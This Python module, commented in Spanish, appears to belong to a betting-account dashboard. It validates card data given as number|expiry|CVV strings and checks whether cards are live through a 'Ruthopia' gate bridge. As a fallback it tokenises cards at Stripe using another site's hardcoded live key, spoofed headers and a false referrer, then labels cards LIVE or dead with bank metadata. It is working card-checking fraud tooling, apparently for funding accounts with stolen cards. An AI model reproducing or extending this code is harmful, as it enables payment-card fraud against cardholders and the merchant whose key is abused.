# card_checker.py
"""Módulo de validación de sintaxis, formato y pre-check de liveness de tarjetas.

Incluye validación LUHN, expiración, y comprobación de liveness HTTP directo vía Stripe/Wabox (estilo Ruthopia /Rw gate).
"""
import os
import time
import logging
from pathlib import Path
from datetime import datetime
from typing import Any, Dict, List, Optional, Tuple
import requests

logger = logging.getLogger(__name__)

# Rutas del proyecto
DASHBOARD_DIR = Path(__file__).parent.resolve()

# Configuración del gate Wabox (extracción de Ruthopia Bóveda)
WABOX_STRIPE_PK = "pk_live_WQNz0qa1BmBu47grZwTpj8BR"

# Configuración del bridge HTTP a Ruthopia (/api/rw/check en KVM4)
_RUTHOPIA_API_URL = "http://172.16.3.1:8787"
_RUTHOPIA_BRIDGE_TIMEOUT = 60
_RUTHOPIA_BRIDGE_RETRIES = 2  # Robert 2026-08-13: ≥2 reintentos solo por infra
_RUTHOPIA_RETRYABLE_STATUS = {"Error"}  # no se reintenta un Declined/Approved real


def _load_ruthopia_dashboard_token() -> str:
    """Lee DASHBOARD_TOKEN del entorno, archivo .env o del mount /app/ruthopia_env (KVM4)."""
    # 1. Variable de entorno directa
    tok = os.environ.get("RUTHOPIA_DASHBOARD_TOKEN") or os.environ.get("DASHBOARD_TOKEN")
    if tok:
        return tok.strip()

    # 2. Mount en KVM4 /app/ruthopia_env
    env_path = Path("/app/ruthopia_env")
    try:
        if env_path.exists():
            for line in env_path.read_text(encoding="utf-8").splitlines():
                line = line.strip()
                if line and not line.startswith("#") and "=" in line:
                    k, v = line.split("=", 1)
                    if k.strip() in ("DASHBOARD_TOKEN", "RUTHOPIA_DASHBOARD_TOKEN"):
                        return v.strip()
    except Exception as exc:
        logger.warning(f"[Bridge] No se pudo leer token de ruthopia: {exc}")

    # 3. Archivo local .env en repo ruthopia
    for candidate in (
        DASHBOARD_DIR.parent / "ruthopia" / ".env",
        DASHBOARD_DIR.parent.parent / "repos" / "ruthopia" / ".env",
        DASHBOARD_DIR.parent.parent / ".env",
    ):
        if candidate.exists():
            try:
                for line in candidate.read_text(encoding="utf-8").splitlines():
                    line = line.strip()
                    if line and not line.startswith("#") and "=" in line:
                        k, v = line.split("=", 1)
                        if k.strip() in ("DASHBOARD_TOKEN", "RUTHOPIA_DASHBOARD_TOKEN"):
                            return v.strip()
            except Exception:
                pass

    return ""


def ruthopia_bridge_check(pipe_4parts: str) -> Tuple[str, str]:
    """POST al bridge ruthopia (gate rw real). Retorna (status.value, message).

    Reintenta hasta _RUTHOPIA_BRIDGE_RETRIES veces SOLO cuando el resultado
    NO es una respuesta bancaria real (error de red/url/token/mantenimiento/
    timeout/500) — Robert 2026-08-13. Un Declined/Approved real no se reintenta.
    """
    url = os.environ.get("RUTHOPIA_API_URL", _RUTHOPIA_API_URL)
    token = _load_ruthopia_dashboard_token()
    if not token:
        return "Error", "bridge token missing"
    attempts = _RUTHOPIA_BRIDGE_RETRIES + 1
    status, msg = "Error", "bridge unknown"
    for i in range(attempts):
        try:
            res = requests.post(
                f"{url}/api/rw/check",
                json={"cards": [pipe_4parts]},
                headers={"Authorization": f"Bearer {token}"},
                timeout=_RUTHOPIA_BRIDGE_TIMEOUT,
            )
            if res.status_code == 401:
                status, msg = "Error", "bridge unauthorized"
            elif res.status_code == 503:
                status, msg = "Error", "bridge maintenance"
            elif res.status_code == 200:
                data = res.json()
                first = (data.get("results") or [{}])[0]
                return first.get("status", "Error"), first.get("message", "")
            else:
                status, msg = "Error", f"bridge http {res.status_code}"
        except Exception as exc:
            status, msg = "Error", f"bridge unreachable: {str(exc)[:60]}"
        if i < attempts - 1 and status in _RUTHOPIA_RETRYABLE_STATUS:
            time.sleep(2 * (i + 1))
            continue
        return status, msg
    return status, msg


def check_luhn(card_number: str) -> bool:
    """Verifica si el número de tarjeta cumple el algoritmo de Luhn."""
    digits = [int(c) for c in card_number if c.isdigit()]
    if not digits or len(digits) < 13 or len(digits) > 19:
        return False
    checksum = 0
    reverse_digits = digits[::-1]
    for i, digit in enumerate(reverse_digits):
        if i % 2 == 1:
            doubled = digit * 2
            checksum += doubled - 9 if doubled > 9 else doubled
        else:
            checksum += digit
    return checksum % 10 == 0


def parse_and_validate_card_pipe(pipe_str: str) -> Tuple[bool, Optional[Dict[str, str]], str]:
    """Parsea un pipe de tarjeta (3 o 4 partes) y valida Luhn + fecha + CVV.

    Retorna: (is_valid, parsed_dict, reason)
    parsed_dict: {"card_number": ..., "card_expiry": "MMYY", "card_cvv": ..., "bin": ...}
    """
    parts = [p.strip() for p in str(pipe_str).split("|") if p.strip()]
    if len(parts) < 3 or len(parts) > 4:
        return False, None, "Formato de pipe inválido (se esperaba num|exp|cvv o num|mm|yyyy|cvv)"

    card_num = parts[0]
    if not check_luhn(card_num):
        return False, None, "Número de tarjeta inválido (Luhn check fallido)"

    if len(parts) == 3:
        exp = parts[1]
        cvv = parts[2]
        if len(exp) != 4 or not exp.isdigit():
            return False, None, "Fecha de vencimiento debe ser MMYY de 4 dígitos"
    else:  # 4 partes
        mm = parts[1].zfill(2)
        yy = parts[2][-2:]
        exp = f"{mm}{yy}"
        cvv = parts[3]
        if len(mm) != 2 or not mm.isdigit() or int(mm) < 1 or int(mm) > 12:
            return False, None, "Mes de vencimiento inválido"
        if len(yy) != 2 or not yy.isdigit():
            return False, None, "Año de vencimiento inválido"

    if not (3 <= len(cvv) <= 4) or not cvv.isdigit():
        return False, None, "CVV inválido"

    mm_int = int(exp[:2])
    yy_int = int(exp[2:]) + 2000
    now = datetime.now()
    if mm_int < 1 or mm_int > 12:
        return False, None, "Mes de vencimiento fuera de rango (1-12)"

    if yy_int < now.year or (yy_int == now.year and mm_int < now.month):
        return False, None, "La tarjeta está vencida"

    parsed = {
        "card_number": card_num,
        "card_expiry": exp,
        "card_cvv": cvv,
        "bin": card_num[:6],
        "pipe_3parts": f"{card_num}|{exp}|{cvv}",
        "pipe_4parts": f"{card_num}|{exp[:2]}|20{exp[2:]}|{cvv}",
    }
    return True, parsed, "OK"


# Caché en memoria para liveness checks de Utopía (TTL 30 min = 1800s)
_UTOPIA_LIVENESS_CACHE: Dict[str, Tuple[float, bool, str, Dict[str, Any]]] = {}
UTOPIA_CACHE_TTL_SEC = 1800  # 30 minutos (regla Robert: no volver a checar en Utopía si fue aprobada recientemente)


def check_ruthopia_db_liveness(card_number: str, max_age_hours: int = 24) -> Optional[Tuple[bool, str, Dict[str, Any]]]:
    """Consulta la base de datos de Ruthopia (/data/ruthopia.db) buscando si la tarjeta
    ya fue verificada y aprobada (check_log con status='Approved' o recarga Telcel) en las últimas N horas.
    Retorna (is_live, label, details) o None si no hay registro reciente.
    """
    if not card_number:
        return None

    import sqlite3
    db_candidates = [
        "/data/ruthopia.db",
        "/app/ruthopia_data/ruthopia.db",
        "/opt/kvm4/apps/ruthopia/data/ruthopia.db",
        "/opt/kvm4/apps/ruthopia/ruthopia.db",
        "/docker/betmexico/data/ruthopia.db",
        "/docker/ruthopia/data/ruthopia.db",
        "/var/lib/docker/volumes/ruthopia_ruthopia-data/_data/ruthopia.db",
    ]

    for db_p in db_candidates:
        if not os.path.exists(db_p):
            continue
        try:
            conn = sqlite3.connect(db_p, timeout=2.0)
            conn.row_factory = sqlite3.Row
            c = conn.cursor()

            # 1. Buscar en check_log
            row = c.execute(
                "SELECT gate, status, ts, message, bin_brand, bin_type, bin_level, bin_bank, bin_country "
                "FROM check_log "
                "WHERE card_full LIKE ? AND UPPER(status) = 'APPROVED' "
                "AND ts >= datetime('now', ?) "
                "ORDER BY id DESC LIMIT 1",
                (f"{card_number}%", f"-{max_age_hours} hours")
            ).fetchone()

            if row:
                gate = row["gate"] or "Ruthopia"
                ts = row["ts"]
                age_m = 0
                try:
                    dt = datetime.fromisoformat(str(ts).replace(" ", "T"))
                    age_m = max(0, int((datetime.now() - dt).total_seconds() / 60))
                except Exception:
                    pass
                age_str = f"hace {age_m}m" if age_m < 60 else f"hace {int(age_m/60)}h"
                brand = row["bin_brand"] or "Card"
                bank = (row["bin_bank"] or "")[:18]
                label = f"🟢 LIVE (Ruthopia {gate} OK · {age_str}) - <i>{brand} {bank}</i>"
                raw = dict(row)
                conn.close()
                return True, label, raw

            conn.close()
        except Exception as ex:
            logger.debug(f"[RuthopiaDB] Error consultando {db_p}: {ex}")
            continue
    return None


def perform_wabox_liveness_check(card_data: Dict[str, str]) -> Tuple[bool, str, Dict[str, Any]]:
    """Ejecuta la autenticación y verificación de liveness oficial importando directamente el WaboxGate de Ruthopia.

    Invocación directa a ruthopia.gates.wabox.WaboxGate (misma VPS, montaje /app/ruthopia).
    Soporta caché de 30 minutos: si la tarjeta ya se checó y aprobó en <30min, se reusa el historial.
    Retorna: (is_live, status_label, raw_details)
    """
    card_num = card_data.get("card_number", "")
    now_ts = time.time()

    # Reuso de caché (< 30 min) para tarjetas previamente aprobadas/checadas
    if card_num in _UTOPIA_LIVENESS_CACHE:
        cached_ts, c_is_live, c_label, c_raw = _UTOPIA_LIVENESS_CACHE[card_num]
        age_sec = now_ts - cached_ts
        if age_sec < UTOPIA_CACHE_TTL_SEC:
            logger.info(f"[LivenessCache] REUSANDO check previo para tarjeta {card_num[:6]}··· (hace {int(age_sec/60)}m)")
            c_label_cached = f"{c_label} <i>(Caché Utopía {int(age_sec/60)}m)</i>"
            return c_is_live, c_label_cached, c_raw

    import sys, os, asyncio

    # 1. Configurar entorno de Ruthopia
    os.environ.setdefault("DATABASE_PATH", "/tmp/ruthopia_temp.db")
    if str(DASHBOARD_DIR) not in sys.path:
        sys.path.insert(0, str(DASHBOARD_DIR))

    # Cargar variables de entorno de Ruthopia si existen
    ruth_env_path = Path("/app/ruthopia_env")
    if ruth_env_path.exists():
        with open(ruth_env_path) as f:
            for line in f:
                if line.strip() and not line.startswith("#") and "=" in line:
                    k, v = line.strip().split("=", 1)
                    k_str = k.strip()
                    v_str = v.strip()
                    if k_str == "DATABASE_PATH":
                        os.environ[k_str] = "/data/ruthopia.db"
                    else:
                        os.environ[k_str] = v_str
    os.environ["DATABASE_PATH"] = "/data/ruthopia.db"

    pipe_str = card_data.get("pipe_4parts", f"{card_data['card_number']}|{card_data['card_expiry'][:2]}|20{card_data['card_expiry'][2:]}|{card_data['card_cvv']}")

    try:
        from ruthopia.gates.wabox import WaboxGate
        from ruthopia.core.models import CheckStatus

        gate = WaboxGate()

        # Ejecutar de forma asíncrona dentro de la función síncrona
        try:
            loop = asyncio.get_event_loop()
        except RuntimeError:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)

        if loop.is_running():
            import nest_asyncio
            nest_asyncio.apply()
            res = loop.run_until_complete(gate.check(pipe_str))
        else:
            res = loop.run_until_complete(gate.check(pipe_str))

        bin_info = res.bin_info or {}
        brand = bin_info.get("type", "Card").capitalize()
        level = bin_info.get("level", "").upper()
        country = bin_info.get("country_flag", "")
        bank = bin_info.get("bank", "")[:20]

        if res.status == CheckStatus.APPROVED:
            label = f"🟢 LIVE (Auth OK) - <i>{brand} {level} {bank} [{country}]</i>"
            raw_res = {"status": "APPROVED", "message": res.message, "raw": str(res)}
            _UTOPIA_LIVENESS_CACHE[card_num] = (now_ts, True, label, raw_res)
            return True, label, raw_res
        else:
            msg = res.message or "Card Declined"
            label = f"🔴 DECLINED (Auth Failed) - <i>{msg[:50]}</i>"
            raw_res = {"status": "DECLINED", "message": res.message, "raw": str(res)}
            # No guardamos declinadas en caché largo para dar oportunidad de reintento si fue blip
            return False, label, raw_res

    except Exception as e:
        logger.warning(f"Error invocando Ruthopia WaboxGate directo: {e}, aplicando fallback tokenizado")
        # Fallback a tokenización Stripe si ocurre un error inesperado
        card_num = card_data["card_number"]
        exp_month = card_data["card_expiry"][:2]
        exp_year = "20" + card_data["card_expiry"][2:]
        cvv = card_data["card_cvv"]

        data = {
            "card[number]": card_num,
            "card[exp_month]": exp_month,
            "card[exp_year]": exp_year,
            "card[cvc]": cvv,
            "key": WABOX_STRIPE_PK,
            "payment_user_agent": "stripe.js/3b1bde7a92; stripe-js-v3/3b1bde7a92; card-element",
            "pasted_fields": "number",
            "referrer": "https://www.waboxapp.com",
        }
        headers = {
            "Authorization": f"Bearer {WABOX_STRIPE_PK}",
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://js.stripe.com",
            "Referer": "https://js.stripe.com/",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "application/json",
        }
        try:
            res = requests.post("https://api.stripe.com/v1/tokens", data=data, headers=headers, timeout=6)
            res_json = res.json()
            if res.status_code == 200 and "id" in res_json:
                card_info = res_json.get("card", {})
                brand = card_info.get("brand", "Card")
                funding = card_info.get("funding", "")
                country = card_info.get("country", "")
                label = f"🟢 LIVE (Tokenized) - <i>{brand} {funding} [{country}]</i>"
                _UTOPIA_LIVENESS_CACHE[card_num] = (now_ts, True, label, res_json)
                return True, label, res_json
            else:
                err = res_json.get("error", {})
                msg = err.get("message", "Card declined")
                code = err.get("code", "declined")
                label = f"🔴 DECLINED - <i>{msg} ({code})</i>"
                return False, label, res_json
        except Exception as ex:
            label = f"🟡 UNCHECKED (Timeout) - <i>{str(ex)[:40]}</i>"
            return True, label, {"error": str(ex)}


def get_card_declines_24h(card_identifier: str, db_conn=None) -> int:
    """Cuenta el número de rechazos bancarios de una tarjeta en deposit_attempts en las últimas 24 horas."""
    if not card_identifier:
        return 0
    c_num = "".join(filter(str.isdigit, str(card_identifier).split("|")[0]))
    if not c_num:
        return 0

    def _query(c):
        cols = [col[1] for col in c.execute("PRAGMA table_info(deposit_attempts)").fetchall()]
        if "card_pipe" not in cols:
            return 0
        row = c.execute(
            "SELECT COUNT(*) AS cnt FROM deposit_attempts "
            "WHERE card_pipe LIKE ? "
            "AND UPPER(status) NOT IN ('APPROVED', 'THREEDS', '3DS_REQUIRED') "
            "AND created_at >= datetime('now', '-24 hours')",
            (f"{c_num}%",),
        ).fetchone()
        if row is None:
            return 0
        try:
            return int(row["cnt"])
        except Exception:
            return int(row[0])

    try:
        if db_conn is not None:
            return _query(db_conn)
        with _get_app_db(write=False) as c:
            return _query(c)
    except Exception as ex:
        import logging
        logging.getLogger("betmexico.dashboard.card_checker").debug(f"Error consultando declines 24h: {ex}")
        return 0


def _get_app_db(write=False):
    """Obtiene el contexto de BD de BetMexico (desde app.db o directamente vía sqlite3)."""
    try:
        from app import db
        return db(write=write)
    except Exception:
        import sqlite3
        db_path = os.environ.get("DATABASE_PATH", "/data/betmexico_accounts.db")
        if not os.path.exists(db_path):
            db_path = "betmexico_accounts.db"
        con = sqlite3.connect(db_path, timeout=5.0)
        con.row_factory = sqlite3.Row
        class DirectCtx:
            def __enter__(self): return con.cursor()
            def __exit__(self, *a):
                if write:
                    con.commit()
                con.close()
        return DirectCtx()


def precheck_card_liveness(card_pipe: str, operator_id: Optional[int] = None) -> Tuple[bool, str, Optional[Dict[str, str]]]:
    """Realiza la verificación completa de liveness pre-depósito.

    Aplica sintaxis, Luhn, fecha, check de tarjetas asociadas y comprobación
    de pasaporte en Ruthopia DB / Ruthopia Gate.
    """
    valid, parsed, reason = parse_and_validate_card_pipe(card_pipe)
    if not valid:
        return False, f"🔴 INVALID - <i>{reason}</i>", None

    # Check temprano: ¿La tarjeta ya está asociada a alguna cuenta? O ¿la cuenta está RATE_LIMITED?
    card_num = parsed.get("card_number")
    with _get_app_db(write=False) as c:
        # 1. Check de tarjetas asociadas/casadas en account_cards o deposit_attempts (APPROVED real)
        existing = c.execute(
            "SELECT account_email FROM account_cards WHERE card_number=?",
            (card_num,)
        ).fetchone()
        if not existing:
            cols = [col[1] for col in c.execute("PRAGMA table_info(deposit_attempts)").fetchall()]
            if "card_pipe" in cols:
                existing = c.execute(
                    "SELECT account_email FROM deposit_attempts WHERE card_pipe LIKE ? AND UPPER(status)='APPROVED' LIMIT 1",
                    (f"{card_num}%",)
                ).fetchone()
        if existing:
            email = existing["account_email"]
            is_superadmin = (operator_id == 1341812706 or str(operator_id) == "1341812706")
            parsed["married_account"] = email
            parsed["is_married"] = True
            
            import logging
            logger = logging.getLogger("betmexico.dashboard.card_checker")
            logger.warning(f"[CARD_MARRIED] Tarjeta {card_num[:6]}··· ya asociada a cuenta {email}")

            # Regla de Oro (Robert 2026-09-02):
            # Solo si las tarjetas ingresadas ya están en una cuenta, ahí se ofrece intentar el depósito
            # en esa cuenta en la que está ligada. Si no, se tiene que excluir del proceso y NO debe de pasar en otra cuenta.
            parsed["is_married_eligible"] = True
            parsed["liveness_kind"] = "married"
            parsed["is_live"] = True
            status_label = f"💍 MARRIED (Ligada a {email})"
            parsed["liveness_label"] = status_label
            return True, status_label, parsed

        # 1b. Detección de plásticos con alto rechazo en 24h (>= 4 declines)
        declines_24h = get_card_declines_24h(card_num, db_conn=c)
        parsed["declines_24h"] = declines_24h
        parsed["high_decline_alert"] = declines_24h >= 4
        if declines_24h >= 4:
            import logging
            logger = logging.getLogger("betmexico.dashboard.card_checker")
            logger.warning(f"[CARD_HIGH_DECLINES] Tarjeta {card_num[:6]}··· acumula {declines_24h} rechazos en las últimas 24h")

        # 2. Check de RATE_LIMITED (excluir cuentas bloqueadas permanentemente)
        if 'email' in parsed:
            account_status = c.execute(
                "SELECT status, dead_reason FROM accounts WHERE email=?",
                (parsed['email'],)
            ).fetchone()
            if account_status and "RATE_LIMITED" in (account_status["dead_reason"] or ""):
                return False, "🔴 RATE_LIMITED - Cuenta bloqueada permanentemente", None

    # 0. Caché en memoria Utopía (TTL 30 min = 1800s) — Zero Overchecking inmediato
    if card_num in _UTOPIA_LIVENESS_CACHE:
        cached_ts, c_is_live, c_label, c_raw = _UTOPIA_LIVENESS_CACHE[card_num]
        age_sec = time.time() - cached_ts
        if age_sec < UTOPIA_CACHE_TTL_SEC and c_is_live:
            parsed["liveness_kind"] = "live"
            parsed["liveness_label"] = f"{c_label} <i>(Caché {int(age_sec/60)}m)</i>"
            parsed["is_live"] = True
            return True, parsed["liveness_label"], parsed

    # PASAPORTE RUTHOPIA DB (Zero Overchecking): Si ya fue aprobada en Ruthopia en las últimas 24h -> LIVE 0ms
    ruth_live = check_ruthopia_db_liveness(card_num)
    if ruth_live:
        is_live, status_label, raw_res = ruth_live
        now_ts = time.time()
        _UTOPIA_LIVENESS_CACHE[card_num] = (now_ts, True, status_label, raw_res)
        parsed["liveness_kind"] = "live"
        parsed["liveness_label"] = status_label
        parsed["is_live"] = True
        return True, status_label, parsed

    # RUTHOPIA CHECK VÍA BRIDGE (gate rw real por HTTP) si no hay historial local
    _TOL_BINS = ("416916", "557908")
    _TOL_REASON_SUBSTRINGS = (
        "does not support this type of purchase",
        "card_not_supported",
        "transaction_not_allowed",
    )

    # Puente auténtico: las tarjetas pasan por el gate rw de ruthopia (HTTP)
    status, msg = ruthopia_bridge_check(parsed["pipe_4parts"])

    # 1. LIVE confirmado por pasarela
    if status == "Approved":
        parsed["liveness_kind"] = "live"
        status_label = f"🟢 LIVE (Auth OK) - <i>{msg[:50]}</i>"
        parsed["liveness_label"] = status_label
        parsed["is_live"] = True
        _UTOPIA_LIVENESS_CACHE[card_num] = (time.time(), True, status_label, {"status": "Approved", "message": msg})
        return True, status_label, parsed

    # 2. Tolerancias bancarias (RF3): BINs exceptuados o mensajes bancarios conocidos
    bin6 = card_num[:6]
    msg_lower = (msg or "").lower()

    if status == "Declined" and bin6 in _TOL_BINS:
        parsed["liveness_kind"] = "tol_bin"
        status_label = "🟡 TOLERADA (BIN) - decline bancario exceptuado"
        parsed["liveness_label"] = status_label
        parsed["is_live"] = True
        return True, status_label, parsed

    if any(sub in msg_lower for sub in _TOL_REASON_SUBSTRINGS):
        parsed["liveness_kind"] = "tol_reason"
        status_label = "🟡 TOLERADA (reason) - decline bancario exceptuado"
        parsed["liveness_label"] = status_label
        parsed["is_live"] = True
        return True, status_label, parsed

    # 3. Errores de infraestructura (token missing, red caída, bridge inaccesible)
    if status == "Error":
        parsed["liveness_kind"] = "error"
        status_label = f"🔴 ERROR (Gate Inaccesible) - <i>{msg[:50]}</i>"
        parsed["liveness_label"] = status_label
        parsed["is_live"] = False
        return False, status_label, parsed

    # 4. Declined estándar (muerta confirmada)
    parsed["liveness_kind"] = "dead"
    status_label = f"🔴 DECLINED (Auth Failed) - <i>{msg[:50]}</i>"
    parsed["liveness_label"] = status_label
    parsed["is_live"] = False
    return False, status_label, parsed


def format_ruthopia_liveness_summary(results: List[Dict[str, Any]]) -> str:
    """Genera la visualización del resultado de liveness con la jerarquía visual oficial de BoTMexico."""
    try:
        from bin_intelligence import lookup_bin_metadata
    except ImportError:
        lookup_bin_metadata = lambda b: {}

    live_items = [i for i in results if i.get("ok")]
    dead_items = [i for i in results if not i.get("ok")]

    sections = []

    if live_items:
        live_lines = [f"<b>LIVE · {len(live_items)}</b>", "━━━━━━━━"]
        for item in live_items:
            pipe = item.get("pipe", "")
            bin6 = pipe.replace("|", "")[:6]
            meta = lookup_bin_metadata(bin6)
            bank = (meta.get("bank") or meta.get("scheme") or "BANCO").upper()
            flag = meta.get("flag", "🇲🇽")
            raw_type = meta.get("type", "Credit").capitalize()
            if "DEB" in meta.get("type", "").upper():
                raw_type = "Debit"
            elif "CRED" in meta.get("type", "").upper():
                raw_type = "Credit"
            level = meta.get("level", "STANDARD").upper()
            live_lines.append(f"✅ <code>{pipe}</code>")
            live_lines.append(f"⌬ {bank} {flag} - {raw_type} {level} ⌬")
        sections.append("\n".join(live_lines))

    if dead_items:
        dead_lines = [f"<b>TIESAS · {len(dead_items)}</b>", "━━━━━━━━"]
        for item in dead_items:
            pipe = item.get("pipe", "")
            dead_lines.append(f"❌ <code>{pipe}</code>")
        sections.append("\n".join(dead_lines))

    divider = "═════════════════════════"
    body = f"\n{divider}\n\n".join(sections) if sections else ""
    summary_footer = f"{divider}\n✅ Aceptadas: <b>{len(live_items)}</b> | ❌ Descartadas: <b>{len(dead_items)}</b>"

    if body:
        return f"{body}\n{summary_footer}"
    return summary_footer
